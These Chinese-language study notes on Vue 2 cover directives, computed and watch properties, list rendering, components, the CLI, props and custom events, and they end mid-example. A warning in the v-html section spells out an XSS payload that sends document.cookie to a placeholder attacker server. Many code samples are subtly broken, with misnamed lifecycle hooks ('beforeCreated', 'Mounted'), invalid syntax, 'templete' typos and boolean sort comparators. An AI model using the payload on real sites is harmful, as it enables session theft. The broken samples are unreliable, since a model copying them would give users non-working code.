# VUE2

## VUE简介

<img src=".\images\QQ截图20230703124418.png" style="zoom:50%;margin-left:50px" />

#### VUE的特点

<img src=".\images\QQ截图20230703125040.png" style="zoom:50%;margin-left:50px" />

<img src=".\images\QQ截图20230703125244.png" style="zoom:50%;margin-left:50px" />

<img src=".\images\QQ截图20230703125827.png" style="zoom:50%;margin-left:50px" />

<img src=".\images\QQ截图20230703125650.png" style="zoom:50%;margin-left:50px" />

#### VUE的原理

vue使用时会创建一个实例，实例绑定html中的一个容器，每次data中有数据更新，vue都会重新解析容器，然后生成虚拟dom，再根据diff算法渲染真实dom，不管diff算法如何优秀，其渲染页面的效率始终是比不上原生js直接操作真实dom的，因为其渲染页面增加了生成虚拟DOM的过程，所以diff只是优化了虚拟dom转换为真实dom的效率，并不能说优化了页面渲染效率

## VUE的简单使用

### 初识VUE

~~~html
<div id='root'>
    <h1>{{name}}</h1> <!-- vue.data的调用方法,{{}}内填写js表达式(有确定值的js语句) -->
    <h1>age:{{age}}</h1>
</div>
~~~

~~~javascript
//创建vue实例
const vm = new Vue({
    el: '#root', //el用于指定当前vue实例为哪个容器，值通常为css选择器字符串
	data: {
      name: '你好',
      age: '18',
    },  //用于存储需要响应到页面的数据
})
~~~

##### <font style="color:red">一个vue实例不能同时接管两个容器</font>

### vue语法

简单来说，插值语法是填在元素内容区域的，指令语法是添加在元素属性区域的。

#### 插值语法

即{{}}

#### 指令语法

~~~html
<div class="root">
    <a v-bind:href="url">点击跳转</a>  <!-- v-bind是vue中的一个指令，用于绑定实例，会将url匹配data.url，v-bind:可以简写成: ,例如 -->
    <a :href="url">点击跳转</a>
</div>
~~~

~~~javascript
new Vue({
    el: '.root',
    data: {
      url: 'www.baidu.com'  
    },
})
~~~

### 数据双向绑定

使用v-bind只能是单向绑定，即js中data改变页面内容会改变，但是页面内容改变后，js中data却不会改变。

而v-model可以实现双向绑定。

<font style="color:red">双向绑定一般用在表单类元素上，如：input，select</font>

~~~html
<div class="root">
    <input type="text" v-model:value="name">
    <!-- v-model:value可简写成v-model,因为v-model默认收集的就是value -->
    <input type="text" v-model="name">
</div>
~~~

~~~javascript
new Vue({
    el: '.root',
    data: {
    	name: '你好'
    },
})
~~~

### el与data的第二种写法

~~~javascript
const vm = new Vue({
    data: function(){
        return {}
    }  //可以写成函数的方式，组件必须这样写，否则报错
}) 
vm.$mount('#root')  //挂载容器，即el的第二种写法
~~~

## MVVM模型

<img src=".\images\QQ截图20230703144641.png" style="zoom:50%;margin-left:50px" />

简单来说，vm就是连接模型和视图的桥梁，模型或者视图其中一个的内容发生改变，vm都会将关联的视图或模型进行更新。

## 数据代理

通过一个对象代理另一个对象中属性的操作

vue实例对象中，将传入的对象存在_data属性中，然后使用对象属性遍历，为vue实例对象添加新的属性，其中这些新的属性就是通过数据代理进行添加的，即将 _data中的属性通过Object.defineProporty方法中的get和set方法代理到vue实例对象中。

<img src=".\images\QQ截图20230703154149.png" style="zoom:50%;margin-left:50px" />

## 事件处理

~~~html
<div class='root'>
    <button v-on:click="showInfo">点我</button>  <!-- 取出methods里的方法，v-on:可简写为@ -->
    <button @click="showInfo">点我</button>
</div>
~~~

~~~javascript
function showInfo(e){  //methods中可以接收事件对象
    alert('你好')
}
new Vue({
    el: '.root',
    data: {},
    methods: {
        showInfo
    }  //这里定义之后才能被事件监听指令找到
})
~~~

#### 带传参的事件函数

~~~html
<div class='root'>
    <!-- 如果不加$event，那么事件参数将会被覆盖掉 -->
    <button v-on:click="showInfo($event,66)">点我</button>  <!-- 取出methods里的方法 -->
</div>
~~~

~~~javascript
new Vue({
    el: '.root',
    data: {},
    methods: {
        showInfo(e,num){
            alert(num)
            console.log(e)
        }
    }
})
~~~

#### 事件修饰符

~~~html
<div class='root'>
    <!-- prevent就是事件修饰符，阻止默认行为 -->
    <a href='www.baidu.com' @click.prevent="showInfo"></a>
</div>
~~~

- prevent：阻止默认行为（常用）
- stop：阻止事件冒泡（常用）
- once：事件只触发一次（常用）
- capture：使用事件捕获模式
- self：只有event.target是当前操作的元素才触发事件
- passive：事件默认行为立即执行，无需等待回调完毕（因为wheel滚动事件触发后是先执行回调才将内容往下滚动,scroll则没有这个问题）

<font style="color:red">事件修饰符是可以连着写的</font>

~~~html
<div class='root' @click="showInfo">
    <a href='www.baidu.com' @click.stop.prevent="showInfo"></a>
</div>
~~~

##### 键盘事件

@keyup/keydown:

- enter：回车键别名
- delete：删除键
- esc：退出
- space：空格
- tab：换行=>配合keydown使用
- up\down\left\right：上下左右

~~~html
<div class='root'>
    <input type="text" placeholder="按下回车键提示输入" @keyup.enter="showInfo">
</div>
~~~

## 计算属性

类似defineProporty的get()和set()方法

~~~html
<div class="root">
	姓: <input type='text' v-model="firstName"> <br/> <br/>
 	名: <input type='text' v-model="lastName"> <br/> <br/>
    全名: <span>{{fullName}}</span>
</div>
~~~

~~~javascript
new Vue({
    el: '.root',
    data: {
        firstName: '张',
        lastName: '三'
    },
    computed: {
        fullName: {
            get(){
             return `${this.firstName}-${this.lastName}`   
            }
        }
        //简写
        //前提:没有set
        //fullName(){return `${this.firstName}-${this.lastName}`}
    }
})
~~~

计算属性中的对象会被添加至vue实例对象中

## 监视属性

~~~javascript
new Vue({
    el: '.root',
    data: {
        hasBeenWatch: true,
    },
    methods: {
        change(){
            return hasBeenWatch=!hasBeenWatch
        }
    },
    computed: {},
    watch: {
        //监测hasBeenWatch属性
        hasBeenWatch: {
            handler(newValue,oldValue){}  //当hasBeenWatch发生改变时调用，hasBeenWatch可以是data或computed中的属性
        	immediate: true, //初始化时让handler调用一下
        }
        //简写，只有handler时可用
        hasBeenWatch(){}  //该函数可当handler使用
    }, //监视属性
})
~~~

<font style="color:red">第二种写法</font>

~~~javascript
const vm = new Vue({
    el: '.root',
    data: {
        hasBeenWatch: true,
    },
    methods: {
        change(){
            return hasBeenWatch=!hasBeenWatch
        }
    },
    computed: {},
})
vm.$watch('hasBeenWatch',{
    handler(newValue,oldValue){}
})
~~~

#### 深度监视

~~~javascript
const vm = new Vue({
    el: '.root',
    data: {
        numbers: {
            a: 1,
            b: 2,
        }
    },
    methods: {
        change(){
            return hasBeenWatch=!hasBeenWatch
        }
    },
    computed: {},
    watch: {
        //这样确实能监测到a，如果又需要监测b那么有需要再写一个，如果有100个属性，那么就需要写100次，非常麻烦
        'numbers.a': {
            handler(newValue,oldValue){}
        },
        //解决方法
        numbers: {
            //开启后就可以监测所有内部属性，包括内部对象中的属性
        	deep: true,  //开启深度监视
        	handler(newValue,oldValue){}
    	}
    }
})
~~~

## 绑定样式

<font style="color:red">vue中命名样式必须是存在在代码中的css样式名称，这样vue会自动寻找到对应样式</font>

### CLASS

#### 字符串写法

~~~css
.happy{}
.sad{}
.normal{}
~~~

~~~html
<div id="root">
    <div class="basic" :class="changeClass" @click="changeMood">{{name}}</div>
</div>
~~~

~~~javascript
const vm = new Vue({
    el: '#root',
    data: {
        name: '你好',
        changeClass: 'normal'
    },
    methods: {
    	changeMood(){
            const mood = ['happy','sad','normal']
            const random = Math.floor(Math.random()*3)
            this.changeClass = mood[random]
        }
	}
})
~~~

#### 数组写法

~~~html
<div id="root">
    <div class="basic" :class="classArr" @click="changeMood">{{name}}</div>
</div>
~~~

~~~javascript
//绑定class样式的数组写法
//适用于要绑定的样式个数、名字不确定
const vm = new Vue({
    el: '#root',
    data: {
        name: '你好',
        classArr: ['happy','sad','normal']
    },
})
~~~

#### 对象写法

~~~html
<div id="root">
    <div class="basic" :class="classObj" @click="changeMood">{{name}}</div>
</div>
~~~

~~~javascript
//绑定class样式的对象写法
//适用于要绑定的样式个数确定，名字也确定，但要动态决定用不用
const vm = new Vue({
    el: '#root',
    data: {
        name: '你好',
        classObj: {
            happy: false,
            sad: false,
            normal: true,
        }
    },
})
~~~

### STYLE

~~~html
<div id="root">
    <div class="basic" :style="{fontSize: fsize+'px'}">{{name}}</div>
</div>
~~~

~~~javascript
const vm = new Vue({
    el: '#root',
    data: {
        name: '你好',
        fsize: 40,
    },
})
~~~

<font style="color:red">或者</font>

~~~html
<div id="root">
    <div class="basic" :style="styleObj">{{name}}</div>
</div>
~~~

~~~javascript
const vm = new Vue({
    el: '#root',
    data: {
        name: '你好',
        styleObj: {
            fontSize: '40px',
        },
    },
})
~~~

## 条件渲染

#### v-show

~~~html
<div id="root">
    <!-- a得到的值如果是false则不显示;如果是true则显示 -->
    <h1 v-show="a">  
        {{name}}
    </h1>
</div>
~~~

~~~javascript
new Vue({
    el: '#root',
    data: {
        name: '你好'
        a: false,
    }
})
~~~

#### v-if

~~~html
<div id="root">
    <h1 v-if="a">  
        {{name}}
    </h1>
</div>
~~~

~~~javascript
new Vue({
    el: '#root',
    data: {
        name: '你好'
        a: false,
    }
})
~~~

#### v-else-if与v-else

v-else-if必须连着if使用，if被打断后则不能使用v-else-if

v-else后不需要跟条件

#### 区别

v-show是调用display，false为none，true为block；而v-if则是直接操作dom，false不添加，true添加

所以v-if效率不高

#### 总结

v-if会破坏结构，但是可以和template搭配使用，就可以解决破坏结构的问题

~~~html
<template v-if="true">
    <h2>vue</h2>
    <h2>react</h2>
    <h2>argular</h2>
</template>
~~~

## 列表渲染

### 基础

#### 遍历数组

~~~html
<div id="root">
    <ul>
        <li v-for="(p,index) in persons" :key="p.id">{{person.id}}-{{person.name}}-{{person.age}}</li>
    </ul>
</div>
~~~

~~~javascript
new Vue({
    el: '#root',
    data: {
        persons: [
            {id: '001',name: '张三', age: 18},
            {id: '002',name: '李四', age: 19},
            {id: '003',name: '王五', age: 20}
        ]
    }
})
~~~

#### 遍历对象

~~~html
<div id="root">
    <ul>
        <li v-for="(value,key) in car" :key="key">{{value}}-{{price}}-{{color}}</li>
    </ul>
</div>
~~~

~~~javascript
new Vue({
    el: '#root',
    data: {
        car: {
            name: '奥迪A8',
            price: '70万',
            color: '黑色'，
        },
    }
})
~~~

#### KEY的作用

key的作用就是给遍历的每个节点做一个标识，类似身份证号

---

index表示索引，p.id表示数据的唯一标识

---

当key的值为index（或不写key，不写key时vue会自动将index补为key）时，会存在两个问题：

- 效率问题
- 不按顺序添加节点会发生错位问题

> 产生原因：虚拟dom对比算法diff中需要使用到key，如果不写或者写的不好，则会影响diff算法的效率和正确性

如下图，添加数据是往数组头添加：

<img src=".\images\QQ截图20230704153350.png" style="zoom:50%;margin-left:50px" />

> diff会根据key值去对比新旧虚拟DOM，发现内容一致的则复用，不一致的则修改
>
> 于是，根据上述情况，名字区域全部都会修改，导致效率低下问题
>
> 而input框区域由于用户操作真实DOM，值并不会传回虚拟DOM，所以新旧虚拟DOM的input框是一样的，于是就复用，最终导致了错位的问题

---

而使用p.id就能解决这个问题：

<img src=".\images\QQ截图20230704154048.png" style="zoom:50%;margin-left:50px" />

### 列表过滤

~~~html
<div id="root">
    <ul>
        <input type="text" placeholder="请输入名字" v-model="keyWord">
        <button @click='sortType=0'>原顺序</button>
        <button @click='sortType=1'>按年龄升序顺序</button>
        <button @click='sortType=2'>按年龄降序顺序</button>
        <li v-for="p in filterPersons" :key="p.id">{{p.name}}-{{p.age}}-{{p.sex}}</li>
    </ul>
</div>
~~~

~~~javascript
new Vue({
    el: '#root',
    data: {
      persons: {
		{id:'001',name:'马冬梅',age:18,sex:'女'},
        {id:'002',name:'周冬雨',age:19,sex:'女'},
    	{id:'003',name:'温兆伦',age:20,sex:'男'},
        {id:'004',name:'周杰伦',age:21,sex:'男'},
      },
      keyWord: '',
    },
	computed: {
        filterPersons(){
            const val = this.keyWord
            const newArr = this.persons.filter((p)=>{
                return p.name.indexOf(val) !== -1
            })
            return newArr
        }
    }
})
~~~

### 列表排序

~~~javascript
//排序一般是建立在filterPersons之上的，不需要每次排序都将全部数据显示出来
data: {
    ...
    sortType: 0 //0表示原顺序，1表示升序，2表示降序
}
computed: {
        filterPersons(){
            const val = this.keyWord
            const sortType = this.sortType
            const newArr = this.persons.filter((p)=>{
                return p.name.indexOf(val) !== -1
            })
            if(sortType===0) return newArr
			if(sortType===1) return newArr.toSorted((a,b)=>a.age<b.age)
            if(sortType===2) return newArr.toSorted((a,b)=>a.age>b.age)
        }
}
~~~

## vue监测数据更新原理

<img src="C:\Users\86152\Desktop\前端\vue\images\QQ截图20230704165348.png" style="zoom:50%;margin-left:50px" />

> 当依次修改对象属性值时，vue能监测到数据更新
>
> 当直接修改对象时，vue监测不到数据更新

**这是什么原因呢？**

vue对于对象数据，会给每个属性进行get和set代理，并且代理的方式是深拷贝，即不管对象位于哪一层都会被代理到

而对于数组数据，会给一些常用的方法（push、shift、unshift、pop、slice、sort、reverse等等，详细请看官网）做包装，我们在vue中调用了这些方法，会被vue包装的方法劫持，转而使用vue包装好的方法，而vue包装好的方法首先会先引用原方法，然后再进行一些响应式操作，也就是说数组数据的操作只有使用这些包装过的方法进行数据更新才能实现响应式

上述图片this.person[0].name有效是因为它是对象内部的属性，被代理了

而this.person[0]直接赋值无效是因为没有使用包装过的方法，并且也不属于被代理的属性

> 小tips:
> Vue.set()
>
> 可以将后来添加的数据变成响应式
>
> 例：Vue.set(vm._data.sex,'sex','男')  类似Object.defineProporty
>
> 或者可以用
>
> vm.$set(vm._data.sex,'sex','女')
>
> 区别：一个是静态方法，一个是实例方法
>
> <font style="color:red">局限性：不能直接在_data上添加属性，只能在\_data层级下的对象上添加属性</font>

## 收集表单数据

之前说了v-model对文本框有效，但是表单内可能有下拉框、勾选框等，如何灵活的将v-model使用在这些框上呢？

<img src="C:\Users\86152\Desktop\前端\vue\images\QQ截图20230704185953.png" style="zoom:50%;margin-left:50px" />

~~~html
<form id="root" @submit.prevent="submit">
    <lable for="username">账号: </lable>
    <!-- v-model.trim即消除空格 -->
	<input id="username" type="text" v-model.trim="userInfo.username"><br/>
    <lable for="pwd">密码: </lable>
	<input id="pwd" type="password" v-model="userInfo.password"><br/>
    <!-- v-model.number可以将内容转换为数字类型再存入vue中 -->
    年龄：<input type="number" v-model.number="userInfo.age"><br/>
    性别：
    	男<input type="radio" name="sex" v-model="userInfo.sex" value="male"> 
    	女<input type="radio" name="sex" v-model="userInfo.sex" value="female"><br/>
    爱好：
    	抽烟<input type="checkbox" name="hobby" v-model="userInfo.hobby" value="smoke">
    	喝酒<input type="checkbox" name="hobby" v-model="userInfo.hobby" value="drink">
    	烫头<input type="checkbox" name="hobby" v-model="userInfo.hobby" value="perm"><br/>
    所属校区：<select v-model="userInfo.city">
    			<option value="">请选择校区</option>
    			<option value="beijing">北京校区</option>
    			<option value="nanjing">南京校区</option>
    		</select><br/>
    其他信息：
    	<!-- v-model.lazy控制当失去焦点才收集数据，不需要实时收集 -->
    	<textarea v-model.lazy="userInfo.other"></textarea><br/>
    <input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="www.baidu.com">用户协议</a>
    <button type="submit">提交</button>
</form>
~~~

~~~javascript
new Vue({
    el: "#root",
    data: {
        userInfo: {
            username: '',
        	password: '',
            age: '',
        	sex: 'male',
        	hobby: [],
        	city: '',
        	other: '',
        	agree: '',
        }
    },
    methods: {
    	submit(){
            console.log(this.userInfo)
        }
	}
})
~~~

## 过滤器

~~~html
<div id="root">
    <!-- 过滤器的使用 -->
    <!-- 第一个过滤器的返回值作为下一个的参数 -->
    <h2>{{time | timeFormater('YYYY年MM月DD日 HH:mm:ss') | mySlice}}</h2>
</div>
~~~

~~~javascript
//定义全局过滤器，只能一个一个写
Vue.filter('mySlice',function(value){
    return value.slice(0,4)
})
new Vue({
    el: "#root",
    data: {
        time: +new Date()
    },
    //局部过滤器，只能在该实例下使用
    filters: {
        //第一个形参接入的是亘古不变的，为管道符前的变量；而括号内的内容则会被后续形参接入，比如model接入'YYYY年MM月DD日 			HH:mm:ss'
    	timeFormater(value,model){
            //dayjs是moment包的函数，需要引入
            if(model) return dayjs(value).format(model)
            return dayjs(value).format('YYYY年MM月DD日 HH:mm:ss')
        },
	}  //定义局部过滤器
})
~~~

## vue中其他内置指令

以学指令：

- v-bind（:）
- v-model
- v-on（@）
- v-if
- v-show
- v-for

### v-text

v-text即给盒子添加文本内容，与{{}}功能类似，但不比{{}}灵活

<font style="color:red">不能解析标签</font>

~~~html
<div id="root" v-text="name"></div>
~~~

~~~javascript
new Vue({
    el: "#root",
    data: {
        name: '你好',
    },
})
~~~

### v-html

<font style="color:red">可以解析html标签，但是不安全，会造成xss攻击风险，最好不要在用户输入框使用，不然用户如果输入\<a href="javascript;location.href="坏人的服务器域名?"+"document.cookie">\</a>则会取得别人的cookie值</font>

~~~html
<div id="root" v-text="name"></div>
~~~

~~~javascript
new Vue({
    el: "#root",
    data: {
        name: '<h1>你好</h1>',
    },
})
~~~

### v-cloak

<font style="color:red">当外部资源（比如vue.js）加载较慢时，如果把该script标签填写在head，那么会阻塞整个html渲染，如果放在body后面，vue没引入，插值语法不被解析直接显示到页面上，这种结果显然不是很理想，这时v-cloak就可以解决这个问题</font>

~~~html
<div id="root">
	<h2>
        {{name}}
    </h2>
</div>
<!-- 如果放在这个位置，页面就会将{{name}}渲染出来，显然不是我们想要的结果 -->
<script src="www.???.com/vue.js"></script>
~~~

~~~css
[v-cloak]:{
    display: none;
}
~~~

~~~html
<div id="root">
    <!-- v-cloak会在vue加载完毕后删除，搭配css就可以保证vue.js没加载完时页面上就不会显示h2标签 -->
	<h2 v-cloak>
        {{name}}
    </h2>
</div>
<script src="www.???.com/vue.js"></script>
~~~

~~~javascript
new Vue({
    el: "#root",
    data: {
        name: '你好',
    },
})
~~~

### v-once

~~~html
<div id="root">
    <!-- 加了v-once只会取一次值 -->
    <h2 v-once>
        初始化的值是：{{n}}
    </h2>
  	<h2>
       	当前的值是：{{n}}
    </h2>
    <button @click="n++">
        点我+1
    </button>
</div>
~~~

~~~javascript
new Vue({
    el: "#root",
    data: {
        n: 1,
    },
})
~~~

### v-pre

~~~html
<div id="root">
    <!-- 加了v-pre可让vue跳过所在节点的编译过程，可让其跳过没用插值、指令语法的节点，加快编译效率 -->
    <h2 v-pre>
       vue其实很简单
    </h2>
  	<h2>
       	当前的值是：{{n}}
    </h2>
    <button @click="n++">
        点我+1
    </button>
</div>
~~~

~~~javascript
new Vue({
    el: "#root",
    data: {
        n: 1,
    },
})
~~~

## 自定义指令

v-big让数字放大10倍

v-fbind让文本框自动获取焦点

~~~html
<div id="root">
	<span>当前数值是：<span v-text="n"></span></span>
    <span>放大十倍的数值是：<span v-big="n"></span></span>
    <button @click="n++">
        点我+1
    </button>
    <hr/>
    <input type="text" v-fbind:value="n">
</div>
~~~

~~~javascript
new Vue({
    el: "#root",
    data: {
        n: 1
    },
    directives: {
        //第一种写法
        //第一个形参接收使用该指令的dom（真实dom），第二个形参接收vue生成的描述该dom的对象,其value属性为n的值
        //只有两个阶段执行该指令：绑定元素阶段、数据更新（模板重新解析）阶段
        //这种写法在绑定元素阶段时是拿不到element的，因为页面中还没有插入真实dom，这样对于某些需要使用到真实dom的操作就无法执			行，比如element.focus()获取焦点
  		big(element,binding){
            element.innerText = binding.value * 10
        },
        //第二种写法
        //vue指令执行会有三个阶段：绑定元素阶段（在虚拟DOM中进行）、插入元素阶段、数据更新（模板重新解析）阶段
        fbind: {
            //指令与元素成功绑定时执行
            bind(element,binding){
                element.innerText = binding.value
            },
            //指令所在元素被插入页面后执行
            inserted(element,binding){
                element.focus()
            },
            //模板重新解析时执行
            update(element,binding){
                element.innerText = binding.value
            },
        },
        //总结：由于bind和update的内容往往一样，所以可以直接使用函数的形式去写，有特殊需求再使用对象的方式添加inserted
        //directives内，指令的this都是window
        //写在这里的指令全部是局部指令，只能在实例绑定的容器下使用
        //全局指令写在Vue.directive()
    }  //内部用于自定义指令，命名不需要写v-，但使用需要加v-
})
~~~

## 生命周期

### 一个例子

~~~html
<div id="root">
    <h2 :style="{opacity}">
        你好
    </h2>
</div>
~~~

~~~javascript
new Vue({
    el: "#root",
    data: {
        opacity: 1;
    },
    //vue完成模板的解析，并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted
    //也就是说只有最开始执行一次，未来即使数据更新也不会再执行
    mounted(){
        setInterval(()=>{
            this.opacity-=0.01
            if(this.opacity<=0) this.opacity=1
        },16)
    }
})
~~~

<font style="color:red">上述mounted函数被称为生命周期函数（生命周期钩子），由于vue执行中有许多阶段，其中有阶段是mounted，这些阶段被合称为vue的生命周期，所以还有许多与mounted同级的生命周期函数</font>

### 生命周期函数

~~~javascript
new Vue({
    el: "#root",
    data: {
      n=1,  
    },
    //数据代理前
    beforeCreated(){},
    //数据代理后
    created(){},
	//生成虚拟DOM但还没转变成真实DOM，所有对DOM的操作都不奏效
	beforeMount(){},
	//将真实DOM放到页面，初始化完成，数据更新后也不再调用
	Mounted(){},  //重要
    //数据更新时触发，数据是新的，页面是旧的，MV不同步
    beforeUpdate(){},
    //数据更新时触发，数据是新的，页面也是新的，MV保持同步
    updated(){},
	//当vm.$destroy()被调用时执行，马上要执行销毁过程，此时虽然能访问到数据，但是对数据的修改并不会再进入update阶段，用于进行		 收尾工作
    beforeDestroy(){}, //重要
	//彻底销毁
	destroyed(){}
})
~~~

## 组件

<img src=".\images\QQ截图20230705171436.png" style="zoom:50%;" />

<img src=".\images\QQ截图20230705173128.png" style="zoom:50%;" />

<img src=".\images\QQ截图20230705173636.png" style="zoom:50%;" />

### 组件的类型

- 单文件组件：只有一个组件的文件
- 非单文件组件：有多个组件的文件

### 组件的使用

~~~html
<div id="root">
    <!-- 3.组件的使用 -->
    <school></school>
    <hr>
    <student></student>
</div>
~~~

~~~javascript
//组件使用分三步：创建组件、注册组件、使用组件
//1.组件的创建
const school = Vue.extend({
    //属性（配置项）基本上和创建Vue实例一样，但不能写el属性，el是为实例服务的
    //data要写成函数形式，为了避免全局污染
    template: `
		<div>
		    <h2>学校名称{{schoolName}}</h2>
    		<h2>学校地址{{address}}</h2>
		</div>
    `,
    data(){
        return {
        		schoolName: 'hhu',
        		address: 'nanjing',
    		}
    	},
})
const student = Vue.extend({
    template: `
    	<div>
    		<h2>学生姓名{{studentName}}</h2>
    		<h2>学生年龄{{age}}</h2>
    	</div>
    `,
    data(){
        return {
            	studentName: '张三',
        		age: 18,
    		}
    	},
})
new Vue({
    el: "#root",
    //2.组件的注册
    //局部注册
    components: {
        school,
        student,
    },
})
//全局注册组件
Vue.component('school',school)
~~~

### 几个注意点

> - 组件名是一个单词组成的，命名需要纯小写
> - 组件名是多个单词组成的，要用-连接，由于直接写my-school，js会报错，所以需要加单引号：'my-school'

### 组件的嵌套

> 要求：将学生组件作为学校组件的子组件

~~~html
<div id="root">
    <school>
    	<student></student>
    </school>
</div>
~~~

~~~javascript
const student = Vue.extend({
    template: `
    	<div>
    		<h2>学生姓名{{studentName}}</h2>
    		<h2>学生年龄{{age}}</h2>
    	</div>
    `,
    data(){
        return {
            	studentName: '张三',
        		age: 18,
    		}
    	},
})
const school = Vue.extend({
    template: `
		<div>
		    <h2>学校名称{{schoolName}}</h2>
    		<h2>学校地址{{address}}</h2>
		</div>
    `,
    data(){
        return {
        		schoolName: 'hhu',
        		address: 'nanjing',
    		}
    	},
    //组件内注册组件
    components: {
        student
    }
})
new Vue({
    el: "#root",
    components: {
        school,
        student,
    },
})
~~~

> app代理的函数嵌套

~~~html
<div id="root"></div>
~~~

~~~javascript
const student = Vue.extend({
    template: `
    	<div>
    		<h2>学生姓名{{studentName}}</h2>
    		<h2>学生年龄{{age}}</h2>
    	</div>
    `,
    data(){
        return {
            	studentName: '张三',
        		age: 18,
    		}
    	},
})
const school = Vue.extend({
    template: `
		<div>
		    <h2>学校名称{{schoolName}}</h2>
    		<h2>学校地址{{address}}</h2>
    		<student></student>
		</div>
    `,
    data(){
        return {
        		schoolName: 'hhu',
        		address: 'nanjing',
    		}
    	},
    components: {
        student,
    }
})
const hello = Vue.extend({
    templete: `<h1>{{msg}}</h1>`,
    data(){
        return {
            msg: '你好',
        }
    }
})
//创建一个组件管理者app
const app = Vue.extend({
    templete: `
    	<div>
    		<school></school>
    		<hello></hello>
    	</div>
    `,
    components: {
        school,
        hello,
    }
})
new Vue({
    el: "#root",
    template: `
    	<app></app>
    `
    components: {app},
})
~~~

### 关于VueComponent

<img src=".\images\QQ截图20230706141341.png" />

### Vue与Vuecomponent的关系

![](.\images\QQ截图20230706145858.png)

### 单文件组件

> 单文件组件命名方式xxxx.vue
>
> xxxx.vue需要通过脚手架（vue官方加好loader和plugins的webpack包）运行
>
> 但是这一节只探讨xxxx.vue内部是如何写的
>
> <font style="color: red">单文件组件相对于非单文件组件最主要的优势就是单文件组件能够单独写样式</font>

~~~vue
<templete>
	<!-- 组件的结构 -->
</templete>
<script>
	//组件交互相关代码（data、methods）
</script>
<style>
    /* 组件的样式 */
</style>
~~~

~~~vue
<templete>
	<div class="demo">
        <h2>
            学校名称{{schoolName}}
        </h2>
        <h2>
            学校地址{{address}}
        </h2>
        <!-- 使用组件 -->
        <student></student>
    </div>
</templete>
<script>
    //引入组件
    import student from './student'
    //暴露组件
    export default {
        name: 'school',
        data(){
            return {
                schoolName: 'hhu',
                address: 'nanjing',
            }
        },
        //注册组件
        components: {
            student,
        }
    }
</script>
<style>
    .demo{
      background-color: #orange;   
    }
</style>
~~~

### 脚手架（vue cli）

脚手架即vue官方加好loader和plugins的webpack包

~~~sh
#脚手架下载（全局）
npm i -g @vue/cli
#创建项目
vue create xxxx
#启动项目
npm run serve
~~~

#### render函数

~~~javascript
//脚手架中有这样一个js语句
new Vue({
    render: h => h(App)
}).$mount('#app')

//原始写法
//new Vue({
//    tempelate: `<app></app>`,
//	  components: {app}
//}).$mount('#app')
//这样写会报错，因为脚手架中引入的vue.js并不是完整版的vue.js
//脚手架中引入的vue.js是不包含模板解析的
//于是使用render函数弥补模板解析的工作
~~~

#### 查看脚手架的webpack.config

~~~sh
#将配置文件输出到output.js
vue inspect > output.js
~~~

#### 修改webpack配置项

> - 在vue.config.js中修改，webpack会进行合并
> - vue官网有详细的配置教程

#### 标签属性ref

> 用于在vue中拿到dom元素
>
> 比如组件的methods属性中有一个方法，需要对dom元素进行操作，如果使用原生js操作dom显然不太好
>
> 这时候就需要使用ref

~~~vue
<template>
	<div>
        <h1 ref="hello">你好</h1>
        <button @click="change">点我修改h1标签</button>
        <school ref="sch"></school>
    </div>
</template>
<script>
    import school from './school'
	export default {
        name: 'app',
        components: {school},
        data(){
            return {},
        },
        methods: {
            change(){
                //拿到有ref属性的标签
                console.log(this.$refs.hello)
                //拿到有ref属性组件实例对象
                console.log(this.$refs.sch)
            }
        }
    }
</script>
~~~

> 如果标签是组件，那么拿到的就是组件的实例对象

#### vc配置项props

> 用于接收传入的参数
>
> 传入的值不允许二次修改
>
> <font style="color:red">可以实现父给子传递数据</font>

~~~vue
<!-- app.vue文件 -->
<template>
	<student name="张三",age="18",sex="女"></student>
</template>
~~~

~~~vue
<!-- student.vue文件 -->
<script>
	export default {
        ...
        //简单接收
        props: ['name','age','sex'],
        //简单有限制的接收
        props: {
            name: String,
            age: Number,
            sex: String,
        },
        //复杂限制的接收
        props: {
            name: {
                type: String,
                required: true,
            },
            age: {
                type: String,
                default: 99
            },
            sex: {
                type: String,
                required: true,
            }
        }
    }
</script>
~~~

#### mixin

> 可以把多个组件共用的配置写在mixin，使用配置只需要调用mixin
>
> 可以添加vm中的各种属性

~~~javascript
//mixin.js文件
export const hunhe1 = {
    methods: {
        showName(){
            this.name
        }
    }
}
export const hunhe2 = {
    methods: {
        consoleLog(){
           	console.log(111)
        }
    }
}
~~~

~~~vue
<!-- 1.vue文件 -->
<script>
	import {hunhe1,hunhe2} from './mixin'
    export default {
        ...
        mixins: [hunhe1,hunhe2],
    }
</script>
~~~

~~~vue
<!-- 2.vue文件 -->
<script>
	import {hunhe1,hunhe2} from './mixin'
    export default {
        ...
        mixins: [hunhe1,hunhe2],
    }
</script>
~~~

#### vue的中间件使用

> 假设名字为plugins.js

![](.\images\QQ截图20230706182136.png)

~~~javascript
//main.js函数中
import plugins from './plugins'
//在plugins.js内定义的一些全局配置以及新创建的实例方法都可以使用了
Vue.use(plugins)
~~~

	#### scoped样式

> 我们在使用多个组件时，可能会有class类名冲突的问题，多个组件都给同一个类名添加css样式，起效果的是后在app.vue中import的组件所写的样式
>
> 要我们使用不同的类名又不太现实，因为实际工作中不可能一一排查这些类名
>
> 所以我们使用scoped
>
> 加入scoped的样式只负责该组件的渲染

~~~vue
<style scoped>
    .demo {
        background-color: red
    }
</style>
~~~

#### 组件的自定义事件

> 给谁绑定的事件就找谁触发
>
> 绑定的事件都是绑定在组件实例对象上
>
> 通过调用$emit()函数触发
>
> <font style="color:red">可以实现子给父传递数据</font>

~~~vue
<!-- app.vue文件 -->
<template>
	<!-- 给Student这个vc绑定了一个hahaha事件，触发hahaha则回调demo函数 -->
	<Student v-on:hahaha="demo"></Student>
	<!-- 也可以使用ref的方式绑定事件 -->
	<Student ref="student"></Student>
</template>
<script>
	export default {
        ...,
        methods: {
        	demo(value){
                //value为触发事件时得到的参数this.name
              console.log('demo被调用了:'+value)  
            },
    	},
        mounted(){
          this.$refs.student.$on('hahaha',this.demo)
        },
    }
</script>
~~~

~~~vue
<!-- Student.vue文件 -->
<template>
	<button @click="sendStudentName"></button>
</template>
<script>
	export default {
        name: 'Student',
        data(){
            return {
            	name: '张三',
        	}
        },
        methods: {
            sendStudentName(){
                //触发Student实例身上的hahaha事件，调用这个函数的效果就类似于点击添加了点击事件的盒子
                //事件名后面接着写带传的参数
                this.$emit('hahaha',this.name)
            }
        }
    }

</script>
~~~

##### 解绑自定义事件

> 给谁绑定就找谁解绑

~~~vue
<!-- Student.vue文件 -->
<template>
	<button @click="sendStudentName">发送学生姓名到App组件</button>
	<button @click="unbind">解绑hahaha事件</button>
</template>
<script>
	export default {
        name: 'Student',
        data(){
            return {
